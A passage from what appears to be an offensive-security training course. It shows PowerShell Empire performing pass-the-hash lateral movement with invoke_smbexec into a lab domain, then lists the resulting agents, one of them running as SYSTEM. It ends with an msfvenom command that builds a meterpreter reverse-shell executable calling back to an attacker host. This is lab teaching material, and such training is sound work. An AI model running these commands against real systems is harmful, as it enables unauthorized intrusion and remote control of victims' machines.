```
(Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff\admin

(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash e2b475c11da2a0748290d87aa96c327

(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com

(Empire: powershell/lateral_movement/invoke_smbexec) > execute
Command executed with service CVTERKCMPPMECQLRWLBK on client251

[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent UVXZ2NC3 checked in
[+] Initial agent UVXZ2NC3 from 10.11.0.22 now active (Slack)
...

```

> Listing 845 -Performing lateral movement with PowerShell Empire

Excellent! The agent was successfully deployed and we can now interact with it:

```
(Empire: K678VC13) > agents

[*] Active agents:

```

| Name | Lang | Internal IP | Machine Name | Username | Process | Delay |
|------|------|-----------|------------|----------|---------|-------|
| S2Y5XW1L | ps | 10.11.0.22 | CLIENT251 | corp\offsec | powershell\2976 | 5/0.0 |
| DWZ49BAP | ps | 10.11.0.22 | CLIENT251 | corp\offsec | explorer\3568 | 5/0.0 |
| K678VC13 | ps | 10.11.0.22 | CLIENT251 | *corp\offsec | powershell\6236 | 5/0.0 |
| UVXZ2NC3 | ps | 10.11.0.22 | CLIENT251 | *corp\SYSTEM | powershell\3912 | 5/0.0 |

```
(Empire: agents) > interact UVXZ2NC3
(Empire: UVXZ2NC3) > 
```

> Listing 846 -Listing and interacting with the new PowerShell Empire agent

# 23.3 Switching Between Empire and Metasploit

The Empire agent supports many features. However, there are often times when we need to use features that are only found in Metasploit. Since we can have both Empire and Metasploit shells on the same compromised host, this is actually quite easy.

> In PowerShell Empire version 2.4, it was possible to use a meterpreter listener and the injectshellcode module to inject a meterpreter shellcode directly in memory from PowerShell. However, in the newest version (2.5) this code is unfortunately broken.

If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a meterpreter reverse shell as an executable.

```
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
[=] No platform was selected, choosing Msf::Module::IPlatform::Windows from the payload
```